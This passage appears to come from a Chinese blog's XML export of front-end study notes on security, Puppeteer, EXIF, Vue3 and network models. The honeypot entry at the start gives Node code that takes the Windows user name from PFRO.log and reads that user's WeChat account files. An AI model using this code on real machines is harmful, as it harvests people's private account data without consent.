<p>但是蜜罐存在安全隐患，如果没有做好隔离，可能成为新的攻击源</p>
<h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><p>C:\Windows\PFRO.log文件用于存放ISA监控日志，通过这个文件可以读取系统的的用户名</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306301400705.png"></p>
<p>得到用户名后就可以读取一些系统文件，例如读取微信个人信息：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> fs <span class="keyword">from</span> <span class="string">&#x27;fs&#x27;</span>;</span><br><span class="line"><span class="comment">//获取微信ID</span></span><br><span class="line"><span class="keyword">const</span> getWxId = &lt;T&gt;<span class="function">(<span class="params">path: T</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> data = fs.<span class="title function_">readFileSync</span>(<span class="string">`C:/Users/<span class="subst">$&#123;path&#125;</span>/Documents/WeChat Files/All Users/config/config.data`</span>).<span class="title function_">toString</span>(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    <span class="keyword">const</span> reg = <span class="regexp">/Documents\\WeChat Files\\([^\\]*)/ig</span></span><br><span class="line">    reg.<span class="title function_">test</span>(data)</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">RegExp</span>.<span class="property">$1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读取信息</span></span><br><span class="line"><span class="keyword">const</span> getData = &lt;T&gt;<span class="function">(<span class="params">path: T, wxId: T</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> data = fs.<span class="title function_">readFileSync</span>(<span class="string">`C:/Users/<span class="subst">$&#123;path&#125;</span>/Documents/WeChat Files/<span class="subst">$&#123;wxId&#125;</span>/config/AccInfo.dat`</span>).<span class="title function_">toString</span>(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取系统用户名</span></span><br><span class="line">fs.<span class="title function_">readFile</span>(<span class="string">&#x27;C:/Windows/PFRO.log&#x27;</span>, <span class="keyword">async</span> (err, data) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> exp = <span class="regexp">/Users\\([^\\]*)/ig</span></span><br><span class="line">    exp.<span class="title function_">test</span>(data.<span class="title function_">toString</span>(<span class="string">&#x27;utf16le&#x27;</span>))</span><br><span class="line">    <span class="keyword">const</span> userName = <span class="title class_">RegExp</span>.<span class="property">$1</span></span><br><span class="line">    <span class="keyword">const</span> wxId = <span class="keyword">await</span> <span class="title function_">getWxId</span>(userName)</span><br><span class="line">    <span class="keyword">const</span> info = <span class="keyword">await</span> <span class="title function_">getData</span>(userName, wxId)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(info);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>自动化UI测试</title>
    <url>/web/study/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/5.%E8%87%AA%E5%8A%A8%E5%8C%96UI%E6%B5%8B%E8%AF%95.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="Puppeteer"><a href="#Puppeteer" class="headerlink" title="Puppeteer"></a>Puppeteer</h1><p>一个npm包，拥有很多功能：</p>
<ul>
<li>支持分布式爬取</li>
<li>实现了深度优先和广度优先算法</li>
<li>支持csv和json line格式导出</li>
<li>插件式的结果存储，比如支持redis</li>
<li>自动插入jquery，可以使用jquery语法进行结果处理</li>
<li>支持截图作为爬取证据</li>
<li>支持模拟不同的设备</li>
</ul>
<h1 id="自动化UI测试"><a href="#自动化UI测试" class="headerlink" title="自动化UI测试"></a>自动化UI测试</h1><p>安装Puppeteer ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pnpm add puppeteer</span><br></pre></td></tr></table></figure>


<p>Puppeteer的包很大，足足100MB，因为他内置了Chromium（谷歌浏览器），所以适合用pnpm</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> puppeteer <span class="keyword">from</span> <span class="string">&quot;puppeteer&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">sleep</span> = (<span class="params">time: number</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>)=&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(resolve,time)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="comment">// 通过launch生成一个“浏览器”实例</span></span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">    <span class="comment">// 默认是true，后台自动完成</span></span><br><span class="line">    <span class="comment">// 如果设为false，就能看到一个浏览器从打开到完成整个任务的全过程</span></span><br><span class="line">    <span class="attr">headless</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="comment">// 将浏览器设置为全屏</span></span><br><span class="line">    <span class="attr">defaultViewport</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">args</span>: [<span class="string">&quot;--start-maximized&quot;</span>]</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 打开一个新标签页</span></span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>()</span><br><span class="line">  <span class="comment">// 跳转到指定页面</span></span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&quot;https://jd.com&quot;</span>)</span><br><span class="line">  <span class="comment">// 聚焦到需要测试的地方（这里是搜索框</span></span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">focus</span>(<span class="string">&quot;#key&quot;</span>)</span><br><span class="line">  <span class="comment">// 输入文字</span></span><br><span class="line">  <span class="keyword">await</span> page.<span class="property">keyboard</span>.<span class="title function_">sendCharacter</span>(<span class="string">&quot;iphone14&quot;</span>)</span><br><span class="line">  <span class="comment">// 搜索</span></span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">click</span>(<span class="string">&quot;.button&quot;</span>)</span><br><span class="line">  <span class="comment">// 等待加载完成</span></span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">waitForSelector</span>(<span class="string">&quot;.gl-item&quot;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 滚动直到底端</span></span><br><span class="line">  <span class="keyword">let</span> isScroll = <span class="literal">true</span></span><br><span class="line">  <span class="keyword">let</span> step = <span class="number">500</span></span><br><span class="line">  <span class="keyword">while</span>(isScroll) &#123;</span><br><span class="line">    <span class="comment">// evaluate中的代码将在浏览器中执行</span></span><br><span class="line">    isScroll = <span class="keyword">await</span> page.evaluate(<span class="function">(<span class="params">step</span>)=&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 滚动条距页面顶部的距离</span></span><br><span class="line">      <span class="keyword">let</span> scrollTop = <span class="variable language_">document</span>.<span class="property">scrollingElement</span>?.<span class="property">scrollTop</span> ?? <span class="number">0</span></span><br><span class="line">      <span class="comment">// 向下滚动</span></span><br><span class="line">      <span class="variable language_">document</span>.<span class="property">scrollingElement</span>!.<span class="property">scrollTop</span> = scrollTop+step</span><br><span class="line">      <span class="comment">// 是否滚动完成（body的高度是否大于滚动高度+首屏高度）</span></span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">clientHeight</span> &gt; scrollTop+<span class="number">2080</span> ? <span class="attr">true</span>: <span class="literal">false</span></span><br><span class="line">    &#125;,step)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">500</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> page.<span class="title function_">screenshot</span>(&#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;iphone14.png&quot;</span>,</span><br><span class="line">    <span class="attr">fullPage</span>: <span class="literal">true</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<p>puppeteer截的（好大一张）图</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306301834844.png"></p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>照片信息EXIF</title>
    <url>/web/study/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/3.%E7%85%A7%E7%89%87%E4%BF%A1%E6%81%AFEXIF.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="EXIF"><a href="#EXIF" class="headerlink" title="EXIF"></a>EXIF</h1><p>EXIF（Exchangeable Image File，可交换图像文件）当中包含了专门为数码相机的照片而定制的元数据，可以记录数码照片的拍摄参数、缩略图及其他属性信息，即镶嵌在JPEG&#x2F;TIFF图像文件格式内的一组拍摄参数</p>
<p>EXIF信息不支持png、webp等图片格式的</p>
<p>人们拍照片时，照片会存储一些隐私信息，例如拍摄的位置，拍摄的时间，相机参数等，这些信息也可能泄露，例如在社交媒体发送照片</p>
<p>微信图片使用默认传输时，它的体积会被压缩得很小，因为破坏了EXIF信息，而设置了原图传输后，微信将保留图片的EXIF信息，可以被别人查看</p>
<h1 id="读取EXIF"><a href="#读取EXIF" class="headerlink" title="读取EXIF"></a>读取EXIF</h1><p>点开图片的属性可以查阅EXIF，也可以使用专门查看EXIF的工具</p>
<p>JavaScript也可以读取EXIF信息，需要EXIF.js</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- CDN引入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/exif-js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span> <span class="attr">id</span>=<span class="string">&quot;img1&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./noOrigin.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>非原图<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span> <span class="attr">id</span>=<span class="string">&quot;img2&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./origin.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>原图<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">width</span>=<span class="string">&quot;300&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span> <span class="attr">id</span>=<span class="string">&quot;img3&quot;</span> <span class="attr">src</span>=<span class="string">&quot;.114514.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>原图2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> file = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#img3&#x27;</span>)</span><br><span class="line"><span class="variable constant_">EXIF</span>.<span class="title function_">getData</span>(file, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> data = <span class="variable constant_">EXIF</span>.<span class="title function_">pretty</span>(<span class="variable language_">this</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>方法：</p>
<ul>
<li><code>EXIF.getData(img, callback)</code>：获取图像的数据</li>
<li><code>EXIF.getTag(img, tag)</code>：获取图像的某个数据</li>
<li><code>EXIF.getAllTags(img)</code>：获取图像的全部数据，值以对象的方式返回</li>
<li><code>EXIF.pretty(img)</code>：获取图像的全部数据，值以字符串的方式返回</li>
</ul>
<p>部分参数：</p>
<ul>
<li>GPS 相关名称<ul>
<li>GPSVersionIDGPS：版本</li>
<li>GPSLatitudeRef：南北纬</li>
<li>GPSLatitude：纬度</li>
<li>GPSLongitudeRef：东西经</li>
<li>GPSLongitude：经度</li>
<li>GPSAltitudeRef：海拔参照值</li>
<li>GPSAltitude：海拔</li>
<li>GPSTimeStamp：GPS时间戳</li>
<li>GPSSatellites：测量的卫星</li>
<li>GPSStatus：接收器状态</li>
<li>GPSMeasureMode：测量模式</li>
<li>GPSDOP：测量精度</li>
<li>GPSSpeedRef：速度单位</li>
<li>GPSSpeed：GPS接收器速度</li>
<li>GPSTrackRef：移动方位参照</li>
<li>GPSTrack：移动方位</li>
<li>GPSImgDirectionRef：图像方位参照</li>
<li>GPSImgDirection：图像方位</li>
<li>GPSMapDatum：地理测量资料</li>
<li>GPSDestLatitudeRef：目标纬度参照</li>
<li>GPSDestLatitude：目标纬度</li>
<li>GPSDestLongitudeRef：目标经度参照</li>
<li>GPSDestLongitude：目标经度</li>
<li>GPSDestBearingRef：目标方位参照</li>
<li>GPSDestBearing：目标方位</li>
<li>GPSDestDistanceRef：目标距离参照</li>
<li>GPSDestDistance：目标距离</li>
</ul>
</li>
<li>GPS 处理方法名<ul>
<li>GPSAreaInformation：GPS区功能变数名</li>
<li>GPSDateStampGPS：日期</li>
<li>GPSDifferential：GPS修正</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>输入法</title>
    <url>/web/study/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/6.%E8%BE%93%E5%85%A5%E6%B3%95.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<p>输入法不一定是安全的，曾曝出不少输入法搜集用户信息获取照片权限，通讯录权限等</p>
<p>使用微信，支付宝等支付软件付款的时候，会发现键盘是App自带的，并非第三方输入法，原因：</p>
<ul>
<li>第三方输入法软件输入某词句的频次过多时，它会把词句记录下来，有可能包括密码</li>
<li>第三方输入法可能会被木马入侵，它会盗取输入法的数据，造成用户密码的损失</li>
</ul>
<p>所以开发移动端的时候遇到支付等安全性场景都会使用虚拟键盘，例如Vant组件库里就有虚拟键盘</p>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue3概述</title>
    <url>/web/study/Vue/1.Vue3%E6%A6%82%E8%BF%B0.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h1><ul>
<li><p>Vue是一套用于构建用户界面的渐进式框架</p>
</li>
<li><p>Vue的优点</p>
<ul>
<li>自底向上逐层运用</li>
<li>只关注视图层，易上手</li>
<li>易与第三方库或现有项目整合</li>
<li>能驱动复杂的单页面项目</li>
</ul>
</li>
<li><p>Vue是MVVM（Model-View-ViewModel）架构</p>
<ul>
<li>View：视图层（UI用户界面）</li>
<li>ViewModel：业务逻辑层（一切JS可视为业务逻辑）</li>
<li>Model：数据层（存储数据、对数据的处理）</li>
</ul>
</li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305011714208.png" alt="MVVM架构"></p>
<h1 id="Vue2-vs-Vue3"><a href="#Vue2-vs-Vue3" class="headerlink" title="Vue2 vs Vue3"></a>Vue2 vs Vue3</h1><ul>
<li>声明式API（Options API）写的比较分散，Vue2的写法</li>
<li>组合式API（Composition API）可以把连贯的逻辑写在一起，或者封装成hook</li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305011714210.png" alt="声明式API &amp; 组合式API"></p>
<h1 id="Vue3新特性"><a href="#Vue3新特性" class="headerlink" title="Vue3新特性"></a>Vue3新特性</h1><ul>
<li><p>重写双向数据绑定</p>
<ul>
<li><p>Vue2：基于<code>Object.defineProperty()</code>实现</p>
<ul>
<li><p>需要使用一个备份对象</p>
</li>
<li><p>需要for in循环，才能给原对象每个属性都加响应式</p>
</li>
<li><p>无法监听数组变化，需要重写数组方法才能实现响应式（但实现的不完全）</p>
</li>
<li><p>代码复杂</p>
</li>
<li><p>原数据新增的属性不带响应式</p>
</li>
<li><p>原数据删除属性时不删除对应响应式</p>
</li>
<li><p>无法处理索引和length属性</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;<span class="attr">property</span>: <span class="number">114514</span>&#125;</span><br><span class="line"><span class="keyword">const</span> _obj = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(_obj, <span class="string">&#x27;property&#x27;</span>, &#123;</span><br><span class="line">    <span class="title function_">get</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;有人读取property属性了&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> property <span class="keyword">in</span> obj? obj.<span class="property">property</span>: <span class="number">0</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">set</span>(<span class="params">value</span>) &#123;</span><br><span class="line">       	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;有人修改property属性了，且值是&#x27;</span>+value)</span><br><span class="line">        obj.<span class="property">property</span> = value</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Vue3：基于Proxy实现（ES6新增）</p>
<ul>
<li><p>丢掉麻烦的备份数据</p>
</li>
<li><p>省去for in循环</p>
</li>
<li><p>监听数组变化</p>
</li>
<li><p>代码简化</p>
</li>
<li><p>监听动态新增的属性</p>
</li>
<li><p>监听删除的属性</p>
</li>
<li><p>监听数据的索引和length属性</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> proxyObj = <span class="keyword">new</span> <span class="title class_">Proxy</span>(obj, &#123;</span><br><span class="line">	<span class="attr">get</span>: <span class="keyword">function</span>(<span class="params">target, property</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;有人读取property属性了&#x27;</span>)</span><br><span class="line">		<span class="keyword">return</span> prop <span class="keyword">in</span> target? target[prop]: <span class="number">0</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">set</span>: <span class="keyword">function</span>(<span class="params">target, property, value</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;有人修改property属性了，且值是&#x27;</span>+value)</span><br><span class="line">		target[prop] = value</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><p>VDOM性能瓶颈的解决</p>
<ul>
<li><p>Vue2中，每次更新diff都是全量对比</p>
</li>
<li><p>Vue3中只对比带有标记的，减少了非动态内容的对比消耗（<a href="https://template-explorer.vuejs.org/">能感受diff优化的工具</a>）</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305011714211.png" alt="diff的优化"></p>
</li>
</ul>
</li>
<li><p>支持Fragments</p>
<blockquote>
<p>文档碎片，表示一个没有父级文件的最小文档对象，被视作轻量版Document。</p>
</blockquote>
<blockquote>
<p>它不是真实DOM树的一部分，变化不触发DOM重绘、不导致性能问题。</p>
</blockquote>
<blockquote>
<p>主要解决DOM元素的插入问题，例如需插入多个节点时，先创建一个Fragment，把节点依次添加到Fragment上，再把Fragment添加到页面Document上，这样只会产生一次重绘；而如果直接把DOM节点依次添加到Document，就会引发多次重绘。</p>
</blockquote>
<ul>
<li>Vue2：Template中只能有一个父节点，其他节点要被包在里面</li>
<li>Vue3：Template里可以有多个节点，并支持了tsx和jsx写法（类似react），还新增了Suspense和teleport两个内置组件，和多v-model用法</li>
</ul>
</li>
<li><p>支持Tree-shaking</p>
<blockquote>
<p>代码运行结果保持不变的前提下，去掉无用代码。</p>
</blockquote>
<ul>
<li>Vue2：无论使用什么功能，最终都会出现在生产代码中，Vue实例在项目中是单例的，捆绑程序无法检测到该对象的哪些属性在代码中被使用到</li>
<li>Vue3：将全局API进行分块，如果不使用某些功能，就不会被包含在基础包中（不会被打包）</li>
</ul>
</li>
<li><p>新增Composition API（Setup语法糖式编程）</p>
</li>
</ul>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>网络模型</title>
    <url>/web/study/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/7.%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="OSI网络模型"><a href="#OSI网络模型" class="headerlink" title="OSI网络模型"></a>OSI网络模型</h1><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306301927119.webp"></p>
<h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><ul>
<li>最靠近应用程序的OSI层，由用户使用相应的接口实现自己的服务</li>
<li>协议：HTTP、FTP、SMTP等</li>
</ul>
<h2 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h2><ul>
<li>进行数据的表示、安全、压缩</li>
<li>可确保一个系统的应用层所发送的信息能被另一个系统的应用层读取</li>
<li>格式：JPEG、ASCII、加密格式等</li>
<li>在表示层，数据将按照网络能理解的方案进行格式化，即管理数据的加密与解密</li>
</ul>
<h2 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h2><ul>
<li>进行建立、管理、终止会话</li>
<li>对应主机进程，指本地主机与远程主机正在进行的会话</li>
<li>负责在网络的两节点之间建立、维持和终止通信</li>
<li>功能：<ul>
<li>建立通信链接</li>
<li>保持会话过程通信连接的畅通</li>
<li>同步两个节点之间的对话、决定通信是否被中断</li>
<li>通信中断时从何处重新发送</li>
</ul>
</li>
<li>客户通过拨号向ISP（因特网服务提供商）请求连接到因特网时，ISP服务器上的会话层向PC客户机上的会话层进行协商连接</li>
<li>若电话线偶然脱落，会话层将会检测到连接中断，并重新发起连接</li>
<li>会话层通过决定节点通信的优先级和通信时间的长短来设置通信期限</li>
<li>会话层就是网络通信的“交通警察”</li>
</ul>
<h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><ul>
<li>定义传输数据的协议端口号，以及进行流控和差错校验</li>
<li>协议：TCP、UDP等</li>
<li>数据包一旦离开网卡即进入网络传输层</li>
<li>传输层定义了一些传输数据的协议和端口号<ul>
<li>TCP：传输控制协议，传输效率低，可靠性强，用于传输可靠性要求高，数据量大的数据</li>
<li>UDP：用户数据报协议，用于传输可靠性要求不高，数据量小的数据</li>
</ul>
</li>
<li>传输协议会同时进行流量控制、或是基于接收方可接收数据的快慢程度规定适当的发送速率</li>
<li>传输层会将从下层接收的数据进行分段和传输，到达目的地后再进行重组，常把这一层数据叫做段</li>
<li>传输层会按照网络能处理的最大尺寸将较长的数据包进行强制分割<ul>
<li>例如，以太网无法接收大于1500字节的数据包</li>
<li>发送方节点的传输层会将数据分割成较小的数据片，同时对每一数据片安排一个序列号</li>
<li>数据到达接收方节点的传输层时，就能以正确的顺序重组，该过程称作排序</li>
</ul>
</li>
<li>传输层是OSI模型中最终要的一层</li>
</ul>
<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><ul>
<li>进行逻辑地址寻址，实现不同网络之间的路径选择等</li>
<li>协议：ICMP、IGMP、IP、ARP、RARP等</li>
<li>在位于不同地理位置的网络中的两个主机系统之间提供连接和路径选择，Internet的发展使得从世界各站点访问信息的用户量大大增加，网络层正是管理这种连接的层</li>
<li>主要功能是将网络地址（例如IP）翻译成对应的物理地址（MAC），并决定如何将数据从发送方路由到接收方<ul>
<li>网络层会通过综合考虑发送优先权、网络拥塞程度、服务质量以及可选路由的花费来决定从一个网络中节点A到另一个网络节点B的最佳路径</li>
<li>由于网络层处理，并智能指导数据传送，而路由器连接网络各段，所以路由器属于网络层</li>
<li>在网络中，“路由”会基于编址方案、使用模式以及可达性来指导数据的发送</li>
</ul>
</li>
<li>网络层用于本地LAN网段之上的计算机系统建立通信<ul>
<li>它之所以可以这样做，是因为它有自已的路由地址结构，这种结构与第二层机器地址是分开的、独立的</li>
<li>这种协议称为路由或可路由协议，包括IP、Novell公司的IPX以及AppleTalk协议</li>
</ul>
</li>
</ul>
<h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><ul>
<li>进行建立逻辑连接、进行硬件地址寻址、差错校验等</li>
<li>会将比特组合成字节进而组合成帧，用MAC地址（网卡的唯一标识）访问介质，可以发现错误但不能纠正</li>
<li>主要功能是考量如何在不可靠的物理线路上进行数据的可靠传递</li>
<li>为了保证传输，从网络层接收的数据被分割成特定的可被物理层传输的帧<ul>
<li>帧是用来移动数据的结构包，不仅包括原始数据，还包括发送方和接收方的物理地址以及检错和控制信息</li>
<li>地址确定了帧将发往何处，而纠错和控制信息则确保帧无差错到达</li>
<li>如果在传送数据时，接收点检测到所传数据中有差错，就要通知发送方重发这一帧</li>
</ul>
</li>
<li>数据链路层在物理层提供比特流服务的基础上，建立相邻节点之间的数据链路，通过差错控制提供数据帧在信道上无差错的传输，并进行各电路上的动作系列</li>
<li>通过广播的方式将数据传播给网络层</li>
</ul>
<h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><ul>
<li>进行物理连接的建立、维护、断开</li>
<li>主要定义物理设备标准，如网线的接口类型，光纤的接口类型，各种传输介质的传输速率等</li>
<li>主要作用是传输比特流，将比特（1和0）转化为电力强弱来进行传输，到达目的地后再转化为比特</li>
</ul>
<h1 id="HTTP2"><a href="#HTTP2" class="headerlink" title="HTTP2"></a>HTTP2</h1><ul>
<li>HTTP2采用二进制格式而非明文文本格式</li>
<li>HTTP2是完全多路复用的，而非有序并阻塞的——只需一个连接即可实现并行</li>
<li>HTTP2使用报头压缩降低开销</li>
<li>HTTP2让服务器可以将响应主动“推送”到客户端缓存中</li>
</ul>
<h2 id="二进制分帧层"><a href="#二进制分帧层" class="headerlink" title="二进制分帧层"></a>二进制分帧层</h2><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306301927117.webp"></p>
<p>在二进制分帧层上，HTTP2会将所有传输的信息分割为更小的消息和帧，并对它们采用二进制格式的编码</p>
<p>其中HTTP1.x的首部信息会被封装到Headers帧，而request body则封装到Data帧里面</p>
<h2 id="多路复用"><a href="#多路复用" class="headerlink" title="多路复用"></a>多路复用</h2><p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306301927116.webp"></p>
<p>HTTP的持久连接可以有效减少TCP建立连接和断开连接的次数</p>
<p>减少了服务器额外的负担，并提升整体HTTP的请求时间</p>
